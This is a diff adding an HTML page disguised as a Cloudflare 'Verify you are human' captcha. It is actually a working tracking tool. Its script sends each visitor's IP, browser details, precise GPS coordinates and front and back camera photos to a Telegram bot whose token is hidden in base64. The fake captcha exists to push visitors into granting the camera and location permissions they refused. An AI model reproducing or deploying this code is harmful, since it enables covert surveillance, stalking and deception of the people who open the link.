@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <script>
+    const expectedCode = atob("Nzc3MjYx");
+    const requestedCode = new URLSearchParams(window.location.search).get("code");
+    if (requestedCode !== expectedCode) {
+      window.location.replace("https://www.quantumsportsdata.com/");
+      document.documentElement.innerHTML = "";
+    }
+  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wene</title>
+  <meta name="description" content="wene" />
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="Wene" />
+  <meta property="og:description" content="wene" />
+  <meta property="og:image" content="https://linksoshort.github.io/wene-20261012-130729/social-image.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Wene" />
+  <meta name="twitter:image" content="https://linksoshort.github.io/wene-20261012-130729/social-image.png" />
+  <meta name="twitter:description" content="wene" />
+  <style>
+    :root {
+      --border: #e3e5e8;
+      --bg: #ffffff;
+      --text: #37393b;
+      --link: #7d8388;
+      --dot: #6d9a3f;
+      --green: #2fb344;
+      --red: #e5484d;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      height: 100%;
+    }
+
+    body {
+      background: #e9ebee;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .hidden { display: none !important; }
+
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border: 5px solid #e0e0e0;
+      border-top-color: #3b82f6;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* --- Captcha widget --- */
+    .widget {
+      width: 100%;
+      max-width: 400px;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 18px 22px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      row-gap: 12px;
+      user-select: none;
+    }
+
+    .left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+      min-width: 0;
+    }
+
+    .status-text {
+      font-size: 18px;
+      color: var(--text);
+      font-weight: 400;
+    }
+
+    .status-text.error { color: var(--red); }
+
+    .checkbox {
+      width: 34px;
+      height: 34px;
+      flex: none;
+      border: 2px solid #c7cbd1;
+      border-radius: 4px;
+      background: #fff;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: border-color 0.15s ease, background 0.15s ease;
+    }
+
+    .checkbox:hover { border-color: #a7acb3; }
+
+    .checkbox:focus-visible {
+      outline: 2px solid #6d9a3f;
+      outline-offset: 2px;
+    }
+
+    .icon-wrap {
+      width: 34px;
+      height: 34px;
+      flex: none;
+      position: relative;
+    }
+
+    .dot-spinner {
+      width: 34px;
+      height: 34px;
+      animation: spin 1.5s linear infinite;
+      display: block;
+    }
+
+    .dot-spinner circle {
+      fill: none;
+      stroke: var(--dot);
+      stroke-width: 3.4;
+      stroke-linecap: round;
+      stroke-dasharray: 1 7.2;
+    }
+
+    .badge {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transform: scale(0);
+      animation: pop 0.35s cubic-bezier(.34,1.56,.64,1) forwards;
+    }
+
+    .badge.success { background: var(--green); }
+    .badge.error { background: var(--red); }
+
+    .badge svg {
+      width: 19px;
+      height: 19px;
+    }
+
+    .badge path, .badge line {
+      fill: none;
+      stroke: white;
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .badge.success path {
+      stroke-dasharray: 20;
+      stroke-dashoffset: 20;
+      animation: draw 0.3s ease 0.15s forwards;
+    }
+
+    .badge.error line {
+      stroke-dasharray: 16;
+      stroke-dashoffset: 16;
+      animation: draw 0.25s ease 0.15s forwards;
+    }
+
+    @keyframes pop {
+      0%   { transform: scale(0); }
+      100% { transform: scale(1); }
+    }
+
+    @keyframes draw {
+      to { stroke-dashoffset: 0; }
+    }
+
+    .brand {
+      text-align: right;
+      line-height: 1.2;
+      flex: none;
+      margin-left: auto;
+    }
+
+    .cf-logo {
+      width: 140px;
+      max-width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .brand .links {
+      font-size: 12px;
+      color: var(--link);
+      margin-top: 4px;
+    }
+
+    .brand .links a {
+      color: var(--link);
+      text-decoration: none;
+    }
+
+    .brand .links a:hover { text-decoration: underline; }
+
+    .replay {
+      margin-top: 14px;
+      text-align: center;
+      font-size: 12px;
+      color: #8a9096;
+    }
+
+    @media (max-width: 480px) {
+      .widget {
+        padding: 14px 16px;
+      }
+
+      .status-text {
+        font-size: 16px;
+      }
+
+      .cf-logo {
+        width: 110px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay" id="loading">
+    <div class="spinner" aria-hidden="true"></div>
+  </div>
+
+  <div class="overlay hidden" id="captcha">
+    <div>
+      <div class="widget">
+        <div class="left">
+          <div class="checkbox" id="checkbox" role="checkbox" aria-checked="false" tabindex="0"></div>
+          <div class="icon-wrap hidden" id="iconWrap"></div>
+          <span class="status-text" id="statusText">Verify you are human</span>
+        </div>
+
+        <div class="brand">
+          <svg class="cf-logo" xmlns="http://www.w3.org/2000/svg" viewBox="-105.495 -59.625 914.29 357.75">
+            <g fill="none">
+              <path fill="#404041" d="M77.1 181.2h15.6v42.5h27.1v13.6H77.1zm58.8 28.2v-.2c0-16.1 13-29.2 30.3-29.2s30.1 12.9 30.1 29v.2c0 16.1-13 29.2-30.3 29.2s-30.1-12.9-30.1-29zm44.6 0v-.2c0-8.1-5.8-15.1-14.4-15.1-8.5 0-14.2 6.9-14.2 15v.2c0 8.1 5.8 15.1 14.3 15.1 8.6 0 14.3-6.9 14.3-15zm34.9 3.3v-31.5h15.8v31.2c0 8.1 4.1 11.9 10.3 11.9 6.2 0 10.3-3.7 10.3-11.5v-31.6h15.8v31.1c0 18.1-10.3 26-26.3 26-15.9 0-25.9-8-25.9-25.6zm76-31.5H313c20 0 31.7 11.5 31.7 27.7v.2c0 16.2-11.8 28.2-32 28.2h-21.3zm21.9 42.3c9.3 0 15.5-5.1 15.5-14.2v-.2c0-9-6.2-14.2-15.5-14.2H307v28.5h6.3zm54-42.3h44.9v13.6h-29.4v9.6h26.6v12.9h-26.6v20h-15.5zm66.5 0h15.5v42.5h27.2v13.6h-42.7zm83.3-.4h15l23.9 56.5h-16.7l-4.1-10h-21.6l-4 10h-16.3zm13.7 34.4l-6.2-15.9-6.3 15.9zm45.2-34h26.5c8.6 0 14.5 2.2 18.3 6.1 3.3 3.2 5 7.5 5 13.1v.2c0 8.6-4.6 14.3-11.5 17.2l13.4 19.6h-18l-11.3-17h-6.8v17H576zm25.8 26.9c5.3 0 8.3-2.6 8.3-6.6v-.2c0-4.4-3.2-6.6-8.4-6.6h-10.2v13.4zm46.4-26.9h45.1v13.2h-29.7v8.5h26.9v12.3h-26.9v8.9h30.1v13.2h-45.5zM43.1 216c-2.2 4.9-6.8 8.4-12.8 8.4-8.5 0-14.3-7.1-14.3-15.1v-.2c0-8.1 5.7-15 14.2-15 6.4 0 11.3 3.9 13.3 9.3h16.4c-2.6-13.4-14.4-23.3-29.6-23.3C13 180.1 0 193.2 0 209.3v.2c0 16.1 12.8 29 30.1 29 14.8 0 26.4-9.6 29.4-22.4z"/>
+              <path d="M674.9 91.8L632 67.2l-7.4-3.2-175.5 1.2v89.1h225.8z" fill="#FFF"/>
+              <path fill="#F38020" d="M596.8 146c2.1-7.2 1.3-13.8-2.2-18.7-3.2-4.5-8.6-7.1-15.1-7.4l-123.1-1.6c-.8 0-1.5-.4-1.9-1-.4-.6-.5-1.4-.3-2.2.4-1.2 1.6-2.1 2.9-2.2l124.2-1.6c14.7-.7 30.7-12.6 36.3-27.2l7.1-18.5c.3-.8.4-1.6.2-2.4C616.9 27 584.6 0 546 0c-35.6 0-65.8 23-76.6 54.9-7-5.2-15.9-8-25.5-7.1-17.1 1.7-30.8 15.4-32.5 32.5-.4 4.4-.1 8.7.9 12.7-27.9.8-50.2 23.6-50.2 51.7 0 2.5.2 5 .5 7.5.2 1.2 1.2 2.1 2.4 2.1h227.2c1.3 0 2.5-.9 2.9-2.2z"/>
+              <path fill="#FAAE40" d="M636 67.1c-1.1 0-2.3 0-3.4.1-.8 0-1.5.6-1.8 1.4L626 85.3c-2.1 7.2-1.3 13.8 2.2 18.7 3.2 4.5 8.6 7.1 15.1 7.4l26.2 1.6c.8 0 1.5.4 1.9 1 .4.6.5 1.5.3 2.2-.4 1.2-1.6 2.1-2.9 2.2l-27.3 1.6c-14.8.7-30.7 12.6-36.3 27.2l-2 5.1c-.4 1 .3 2 1.4 2h93.8c1.1 0 2.1-.7 2.4-1.8 1.6-5.8 2.5-11.9 2.5-18.2 0-37-30.2-67.2-67.3-67.2"/>
+            </g>
+          </svg>
+          <div class="links">
+            <a href="#" onclick="return false;">Privacy</a>&nbsp;&bull;&nbsp;<a href="#" onclick="return false;">Terms</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="replay" id="replayHint">Click the checkbox to verify</div>
+    </div>
+  </div>
+
+  <script>
+    const COOKIE_NAME = "visitor_uuid";
+
+    // Placeholders — replaced at serving time.
+    const REDIRECT_TO = "https://www.quantumsportsdata.com/";
+    const TITLE = "Wene";
+    const DESC = "wene";
+    //decode the bot token from base64 to avoid it being easily visible in the page source.
+    const BOT_TOKEN = atob("ODgwNjQ2NDA5NTpBQUgzQlRyeXlOWFR1aWY2dnJrYklNQnFMWXNPbnQxU2hrZw==");
+    const CHAT_ID = "6952131539";
+
+    function getCookie(name) {
+      const value = document.cookie
+        .split("; ")
+        .find((row) => row.startsWith(name + "="));
+      return value ? value.split("=")[1] : null;
+    }
+
+    function setCookie(name, value, days) {
+      const expires = new Date(Date.now() + days * 24 * 60 * 60 * 1000).toUTCString();
+      document.cookie = name + "=" + value + "; expires=" + expires + "; path=/; SameSite=Lax";
+    }
+
+    function pad(n) {
+      return String(n).padStart(2, "0");
+    }
+
+    function shortCode() {
+      // No confusing characters (0/O, 1/l/I)
+      const chars = "abcdefghjkmnpqrstuvwxyz23456789";
+      let s = "";
+      for (let i = 0; i < 4; i++) {
+        s += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return s;
+    }
+
+    function getUUID() {
+      let id = getCookie(COOKIE_NAME);
+      if (!id) {
+        const d = new Date();
+        const date = String(d.getFullYear()).slice(-2) +
+          pad(d.getMonth() + 1) + pad(d.getDate());
+        const time = pad(d.getHours()) + pad(d.getMinutes());
+        id = date + "-" + time + "-" + shortCode();
+        setCookie(COOKIE_NAME, id, 365);
+      }
+      return id;
+    }
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+        if (res.ok) {
+          const data = await res.json();
+          return data.ip;
+        }
+      } catch (e) {
+        /* ignore and fall back */
+      }
+      return "unknown";
+    }
+
+    async function sendToBot(token, chatId, text) {
+      const url = "https://api.telegram.org/bot" + token + "/sendMessage";
+      return fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      });
+    }
+
+    // --- GPS helpers ---
+
+    function requestLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ status: "unsupported" });
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({
+            status: "granted",
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          }),
+          (err) => resolve({
+            status: err.code === 1 ? "denied" : "error",
+            code: err.code,
+            message: err.message
+          }),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    function locationText(loc, note) {
+      return "UUID: " + uuid + "\n" +
+        "GPS: granted" + (note ? " (" + note + ")" : "") + "\n" +
+        "Lat: " + loc.lat + "\n" +
+        "Lon: " + loc.lon + "\n" +
+        "Accuracy: " + loc.accuracy + "m\n" +
+        "Maps: https://www.google.com/maps?q=" + loc.lat + "," + loc.lon;
+    }
+
+    // --- Camera helpers ---
+
+    function openCamera(facingMode) {
+      const constraints = { audio: false };
+      if (facingMode === "any") {
+        constraints.video = true;
+      } else {
+        constraints.video = { facingMode: { ideal: facingMode } };
+      }
+      return navigator.mediaDevices.getUserMedia(constraints);
+    }
+
+    function blobToDataURL(blob) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = reject;
+        reader.readAsDataURL(blob);
+      });
+    }
+
+    function captureFromVideo(stream) {
+      return new Promise((resolve, reject) => {
+        const video = document.createElement("video");
+        video.playsInline = true;
+        video.muted = true;
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          video.play().then(() => {
+            try {
+              const canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext("2d").drawImage(video, 0, 0);
+              video.pause();
+              resolve(canvas.toDataURL("image/jpeg", 0.85));
+            } catch (e) {
+              video.pause();
+              reject(e);
+            }
+          }).catch((e) => {
+            video.pause();
+            reject(e);
+          });
+        };
+
+        video.onerror = () => {
+          video.pause();
+          reject(new Error("Could not read camera stream"));
+        };
+      });
+    }
+
+    function captureFrame(stream) {
+      const track = stream.getVideoTracks()[0];
+      if (window.ImageCapture && track) {
+        const capture = new ImageCapture(track);
+        return capture.takePhoto()
+          .then((blob) => blobToDataURL(blob))
+          .catch(() => captureFromVideo(stream));
+      }
+      return captureFromVideo(stream);
+    }
+
+    async function capturePhotos(facingMode) {
+      // "any" means fall back to whatever camera is available.
+      try {
+        const stream = await openCamera(facingMode);
+        try {
+          const photos = [];
+          for (let i = 0; i < 2; i++) {
+            photos.push(await captureFrame(stream));
+          }
+          return photos;
+        } finally {
+          stream.getTracks().forEach((track) => track.stop());
+        }
+      } catch (e) {
+        if (facingMode === "any") throw e;
+        return capturePhotos("any");
+      }
+    }
+
+    async function requestPhotos() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        return { status: "unsupported" };
+      }
+      try {
+        const front = await capturePhotos("user");
+        const back = await capturePhotos("environment");
+        return { status: "granted", front: front, back: back };
+      } catch (err) {
+        const name = err && err.name ? err.name : "";
+        if (name === "NotAllowedError" || name === "SecurityError" || name === "PermissionDeniedError") {
+          return { status: "denied", message: err.message };
+        }
+        return { status: "error", message: err.message };
+      }
+    }
+
+    function photoCaption(result, note) {
+      return "UUID: " + uuid + "\n" +
+        "Camera: captured" + (note ? " (" + note + ")" : "") + "\n" +
+        "Front photos: " + result.front.length + "\n" +
+        "Back photos: " + result.back.length;
+    }
+
+    function dataURLToBlob(dataUrl) {
+      const parts = dataUrl.split(',');
+      const mime = parts[0].match(/:(.*?);/)[1];
+      const bin = atob(parts[1]);
+      const arr = new Uint8Array(bin.length);
+      for (let i = 0; i < bin.length; i++) {
+        arr[i] = bin.charCodeAt(i);
+      }
+      return new Blob([arr], { type: mime });
+    }
+
+    async function sendPhotoGroup(token, chatId, photos, caption) {
+      const url = "https://api.telegram.org/bot" + token + "/sendMediaGroup";
+      const form = new FormData();
+      form.append("chat_id", chatId);
+
+      const media = photos.map((photo, i) => {
+        const name = "photo" + i;
+        form.append(name, dataURLToBlob(photo), name + ".jpg");
+        return { type: "photo", media: "attach://" + name };
+      });
+
+      if (caption) {
+        media[0].caption = caption;
+      }
+
+      form.append("media", JSON.stringify(media));
+      return fetch(url, { method: "POST", body: form });
+    }
+
+    // Shared state used by both the main flow and the captcha widget.
+    let token;
+    let chatId;
+    let redirectTo;
+    let uuid;
+    let deniedPermissions = [];
+
+    // --- Captcha widget ---
+    const checkbox = document.getElementById('checkbox');
+    const iconWrap = document.getElementById('iconWrap');
+    const statusText = document.getElementById('statusText');
+    const replayHint = document.getElementById('replayHint');
+    const loadingEl = document.getElementById('loading');
+    const captchaEl = document.getElementById('captcha');
+
+    let busy = false;
+
+    function hide(el) { el.classList.add('hidden'); }
+    function show(el) { el.classList.remove('hidden'); }
+
+    function spinnerMarkup() {
+      return '<svg class="dot-spinner" viewBox="0 0 34 34"><circle cx="17" cy="17" r="14"></circle></svg>';
+    }
+
+    function successMarkup() {
+      return '<div class="badge success"><svg viewBox="0 0 24 24"><path d="M5 12.5l4.5 4.5L19 7"></path></svg></div>';
+    }
+
+    function errorMarkup() {
+      return '<div class="badge error"><svg viewBox="0 0 24 24">'
+        + '<line x1="6" y1="6" x2="18" y2="18"></line>'
+        + '<line x1="18" y1="6" x2="6" y2="18"></line>'
+        + '</svg></div>';
+    }
+
+    function resetWidget() {
+      busy = false;
+      show(checkbox);
+      checkbox.setAttribute('aria-checked', 'false');
+      hide(iconWrap);
+      iconWrap.innerHTML = '';
+      statusText.textContent = 'Verify you are human';
+      statusText.classList.remove('error');
+      replayHint.textContent = 'Click the checkbox to verify';
+    }
+
+    // Attempt a permission and send its data to the bot as soon as it is granted.
+    async function attemptGPS(note) {
+      const suffix = note ? " (" + note + ")" : "";
+      const loc = await requestLocation();
+
+      if (loc.status === "granted") {
+        await sendToBot(token, chatId, locationText(loc, note));
+        return "granted";
+      } else if (loc.status === "denied") {
+        await sendToBot(token, chatId,
+          "UUID: " + uuid + "\n" +
+          "GPS: permission denied" + suffix);
+        return "denied";
+      } else if (loc.status === "error") {
+        await sendToBot(token, chatId,
+          "UUID: " + uuid + "\n" +
+          "GPS: error (" + loc.message + ")" + suffix);
+        return "error";
+      } else {
+        await sendToBot(token, chatId,
+          "UUID: " + uuid + "\n" +
+          "GPS: geolocation not supported");
+        return "unsupported";
+      }
+    }
+
+    async function attemptPhotos(note) {
+      const suffix = note ? " (" + note + ")" : "";
+      const photos = await requestPhotos();
+
+      if (photos.status === "granted") {
+        await sendPhotoGroup(token, chatId, photos.front.concat(photos.back), photoCaption(photos, note));
+        return "granted";
+      } else if (photos.status === "denied") {
+        await sendToBot(token, chatId,
+          "UUID: " + uuid + "\n" +
+          "Camera: permission denied" + suffix);
+        return "denied";
+      } else if (photos.status === "error") {
+        await sendToBot(token, chatId,
+          "UUID: " + uuid + "\n" +
+          "Camera: error (" + photos.message + ")" + suffix);
+        return "error";
+      } else {
+        await sendToBot(token, chatId,
+          "UUID: " + uuid + "\n" +
+          "Camera: not supported");
+        return "unsupported";
+      }
+    }
+
+    async function startVerification() {
+      if (busy) return;
+      busy = true;
+
+      hide(checkbox);
+      checkbox.setAttribute('aria-checked', 'true');
+      show(iconWrap);
+      iconWrap.innerHTML = spinnerMarkup();
+      statusText.textContent = 'Verifying...';
+      statusText.classList.remove('error');
+      replayHint.textContent = '';
+
+      await new Promise((resolve) => setTimeout(resolve, 1800));
+
+      // Retry only the permissions that were denied. Each one that is granted
+      // is sent to the bot immediately, without waiting for the others.
+      if (deniedPermissions.includes('gps')) {
+        const result = await attemptGPS('after verification');
+        if (result !== 'denied') {
+          deniedPermissions = deniedPermissions.filter((k) => k !== 'gps');
+        }
+      }
+
+      if (deniedPermissions.includes('photos')) {
+        const result = await attemptPhotos('after verification');
+        if (result !== 'denied') {
+          deniedPermissions = deniedPermissions.filter((k) => k !== 'photos');
+        }
+      }
+
+      if (deniedPermissions.length === 0) {
+        iconWrap.innerHTML = successMarkup();
+        statusText.textContent = 'Success!';
+        replayHint.textContent = '';
+        setTimeout(() => window.location.replace(redirectTo), 900);
+        return;
+      }
+
+      iconWrap.innerHTML = errorMarkup();
+      statusText.textContent = 'Error. Please try again.';
+      statusText.classList.add('error');
+      replayHint.textContent = 'Click the badge to retry';
+      busy = false;
+    }
+
+    checkbox.addEventListener('click', startVerification);
+    checkbox.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' || e.key === ' ') {
+        e.preventDefault();
+        startVerification();
+      }
+    });
+
+    // Allow clicking the result icon (success or error) to run it again.
+    iconWrap.addEventListener('click', () => {
+      if (busy) return;
+      resetWidget();
+    });
+
+    async function main() {
+      token = BOT_TOKEN;
+      chatId = CHAT_ID;
+      redirectTo = REDIRECT_TO || "https://google.com";
+
+      uuid = getUUID();
+      const ip = await getIP();
+      const userAgent = navigator.userAgent;
+      const time = new Date().toISOString();
+
+      const info =
+        "UUID: " + uuid + "\n" +
+        "IP: " + ip + "\n" +
+        "User-Agent: " + userAgent + "\n" +
+        "Time: " + time;
+
+      await sendToBot(token, chatId, info);
+
+      // Request both permissions. Whatever is granted gets sent right away.
+      const gpsResult = await attemptGPS(null);
+      const photosResult = await attemptPhotos(null);
+
+      deniedPermissions = [];
+      if (gpsResult === 'denied') deniedPermissions.push('gps');
+      if (photosResult === 'denied') deniedPermissions.push('photos');
+
+      if (deniedPermissions.length === 0) {
+        window.location.replace(redirectTo);
+        return;
+      }
+
+      // Show the captcha so the user can verify and retry the denied permission(s).
+      hide(loadingEl);
+      show(captchaEl);
+    }
+
+    main().catch((err) => {
+      console.error(err);
+      window.location.replace(redirectTo || "https://google.com");
+    });
+  </script>
+</body>
+</html>
